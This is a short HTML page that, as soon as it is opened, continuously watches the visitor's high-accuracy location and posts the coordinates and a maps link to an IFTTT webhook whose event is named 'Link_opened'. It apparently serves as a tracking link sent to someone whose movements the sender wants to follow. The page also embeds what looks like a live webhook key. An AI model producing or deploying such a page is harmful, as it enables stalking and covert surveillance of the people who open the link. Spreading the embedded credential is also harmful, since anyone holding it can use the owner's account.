<!DOCTYPE html>
<html>
<head>
  <title>Live Location Sender</title>
  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        // Watch position continuously
        navigator.geolocation.watchPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;
          var mapsLink = "https://maps.google.com/?q=" + latitude + "," + longitude;

          // IFTTT webhook URL
          var url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";

          // Send location to IFTTT
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              value1: latitude,
              value2: longitude,
              value3: mapsLink
            })
          })
          .then(() => console.log("Location sent!"))
          .catch(error => console.error("Error sending location:", error));
        }, function(error) {
          console.error("Error getting location:", error);
        }, { enableHighAccuracy: true });
      } else {
        alert("Geolocation not supported on this device.");
      }
    }

    window.onload = sendLocation;
  </script>
</head>
<body>
  <h2>Sharing your location automatically...</h2>
  <p>Please allow location access when prompted.</p>
</body>
</html>
